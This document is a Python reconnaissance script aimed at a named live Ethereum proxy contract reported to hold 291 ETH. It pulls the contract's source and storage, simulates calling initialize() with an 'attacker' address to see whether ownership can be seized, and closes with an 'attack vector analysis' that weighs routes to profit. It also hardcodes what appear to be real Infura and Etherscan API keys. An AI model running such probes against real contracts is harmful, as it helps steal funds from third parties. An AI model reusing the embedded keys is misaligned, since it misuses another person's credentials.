#!/usr/bin/env python3
"""
Deep check on implementation initialization vulnerability
Proxy: 0xf74bf048138a2b8f825eccabed9e02e481a0f6c0 (291 ETH)
Implementation: 0x0634ee9e5163389a04b3ff6c9b05de71c24c1916
"""
import json
import subprocess

RPC = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c"
ETHERSCAN_API = "5UWN6DNT7UZCEJYNE3J6FCVAWH4QJW255K"

def rpc_call(method, params):
    payload = {"jsonrpc": "2.0", "method": method, "params": params, "id": 1}
    cmd = ["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json",
           "-d", json.dumps(payload), RPC]
    result = subprocess.run(cmd, capture_output=True, text=True)
    try:
        return json.loads(result.stdout)
    except:
        return None

def eth_call(to, data, from_addr="0x0000000000000000000000000000000000000001"):
    result = rpc_call("eth_call", [{"to": to, "data": data, "from": from_addr}, "latest"])
    return result

def estimate_gas(to, data, from_addr="0x0000000000000000000000000000000000000001"):
    result = rpc_call("eth_estimateGas", [{"to": to, "data": data, "from": from_addr}])
    return result

def get_balance(addr):
    result = rpc_call("eth_getBalance", [addr, "latest"])
    if result and 'result' in result:
        return int(result['result'], 16) / 1e18
    return 0

def get_storage(addr, slot):
    result = rpc_call("eth_getStorageAt", [addr, slot, "latest"])
    if result and 'result' in result:
        return result['result']
    return None

def get_source(addr):
    url = f"https://api.etherscan.io/v2/api?chainid=1&module=contract&action=getsourcecode&address={addr}&apikey={ETHERSCAN_API}"
    result = subprocess.run(["curl", "-s", url], capture_output=True, text=True)
    try:
        data = json.loads(result.stdout)
        if data.get("status") == "1" and data.get("result"):
            return data["result"][0]
    except:
        pass
    return None

PROXY = "0xf74bf048138a2b8f825eccabed9e02e481a0f6c0"
IMPL = "0x0634ee9e5163389a04b3ff6c9b05de71c24c1916"

print("=" * 80)
print("IMPLEMENTATION INITIALIZATION VULNERABILITY CHECK")
print("=" * 80)

print(f"\nProxy: {PROXY}")
print(f"Proxy Balance: {get_balance(PROXY):.4f} ETH")
print(f"\nImplementation: {IMPL}")
print(f"Implementation Balance: {get_balance(IMPL):.4f} ETH")

# Get implementation source
print("\n[Implementation Source Analysis]")
impl_source = get_source(IMPL)
if impl_source:
    name = impl_source.get("ContractName", "Unknown")
    print(f"Contract Name: {name}")

    src = impl_source.get("SourceCode", "")
    # Parse multi-file
    if src.startswith("{{"):
        try:
            src_json = json.loads(src[1:-1])
            sources = src_json.get("sources", {})
            src = "\n".join([v.get("content", "") for v in sources.values()])
        except:
            pass
    elif src.startswith("{"):
        try:
            src_json = json.loads(src)
            sources = src_json.get("sources", {})
            src = "\n".join([v.get("content", "") for v in sources.values()])
        except:
            pass

    print(f"Source length: {len(src)} chars")

    # Find initialize function
    if "initialize" in src.lower():
        print("\n[Initialize Functions Found]")
        import re
        init_pattern = r"function\s+initialize[^{]*\{"
        matches = re.findall(init_pattern, src, re.IGNORECASE | re.DOTALL)
        for m in matches[:3]:
            print(f"  {m[:120]}...")

    # Check for selfdestruct
    if "selfdestruct" in src.lower():
        print("\n[!!!] Contract contains SELFDESTRUCT")
        lines = src.split('\n')
        for i, line in enumerate(lines):
            if "selfdestruct" in line.lower():
                print(f"  Line {i+1}: {line.strip()[:80]}")

    # Check for owner/admin functions
    print("\n[Owner/Admin Functions]")
    owner_patterns = [
        "onlyOwner", "onlyAdmin", "owner()", "admin()",
        "transferOwnership", "renounceOwnership"
    ]
    for p in owner_patterns:
        if p in src:
            print(f"  Found: {p}")

# Check implementation storage for initialization state
print("\n[Implementation Storage State]")
# Common initialization slots
init_slots = [
    ("0x0", "slot 0"),
    ("0x1", "slot 1"),
    # OpenZeppelin Initializable _initialized slot
    ("0x0000000000000000000000000000000000000000000000000000000000000000", "Initializable _initialized"),
]

for slot, desc in init_slots:
    val = get_storage(IMPL, slot)
    if val:
        print(f"  {desc}: {val}")

# Check proxy storage for initialization
print("\n[Proxy Storage State]")
for i in range(10):
    val = get_storage(PROXY, hex(i))
    if val and val != "0x" + "0"*64:
        print(f"  Slot {i}: {val}")

# Try calling initialize on implementation
print("\n[Calling initialize(address) on Implementation]")

# encode initialize(address) with attacker address
attacker = "0x0000000000000000000000000000000000000001"
init_data = "0xc4d66de8" + "000000000000000000000000" + attacker[2:]

# First, check current owner on implementation
owner_result = eth_call(IMPL, "0x8da5cb5b")  # owner()
if owner_result and owner_result.get('result'):
    print(f"  Current implementation owner: {owner_result['result']}")

# Check _initialized value (OpenZeppelin Initializable)
# Usually stored at slot 0 or a mapping
initialized_result = eth_call(IMPL, "0x158ef93e")  # initialized()
if initialized_result and initialized_result.get('result'):
    print(f"  initialized(): {initialized_result['result']}")

# Try gas estimation for initialize
gas_result = estimate_gas(IMPL, init_data)
if gas_result:
    if 'result' in gas_result:
        gas = int(gas_result['result'], 16)
        print(f"  [!] initialize(address) gas estimate: {gas}")
        print(f"  [!] This means the function is callable!")

        # Check what calling initialize would actually do
        call_result = eth_call(IMPL, init_data)
        if call_result:
            print(f"  Call result: {call_result}")
    elif 'error' in gas_result:
        print(f"  Error: {gas_result['error'].get('message', '')[:100]}")

# KEY QUESTION: Does initializing the implementation help attack the proxy?
print("\n" + "=" * 60)
print("ATTACK VECTOR ANALYSIS")
print("=" * 60)

print("""
The implementation's initialize being callable on the IMPLEMENTATION
contract itself does NOT directly affect the PROXY.

For this to be exploitable, we need one of:
1. selfdestruct in implementation (would kill impl, proxy becomes useless - no profit)
2. delegatecall from implementation to attacker (rare)
3. Some way to use implementation ownership to affect proxy

Checking for these patterns...
""")

# Check for delegatecall in implementation
if impl_source:
    src = impl_source.get("SourceCode", "")
    if src.startswith("{{"):
        try:
            src_json = json.loads(src[1:-1])
            sources = src_json.get("sources", {})
            src = "\n".join([v.get("content", "") for v in sources.values()])
        except:
            pass

    if "delegatecall" in src.lower():
        print("[!] Implementation contains delegatecall")
        lines = src.split('\n')
        for i, line in enumerate(lines):
            if "delegatecall" in line.lower():
                print(f"  Line {i+1}: {line.strip()[:80]}")
    else:
        print("[-] No delegatecall in implementation (good)")

    if "selfdestruct" in src.lower():
        print("[!] Implementation contains selfdestruct")
    else:
        print("[-] No selfdestruct in implementation")

print("\n" + "=" * 80)
print("ANALYSIS COMPLETE")
print("=" * 80)
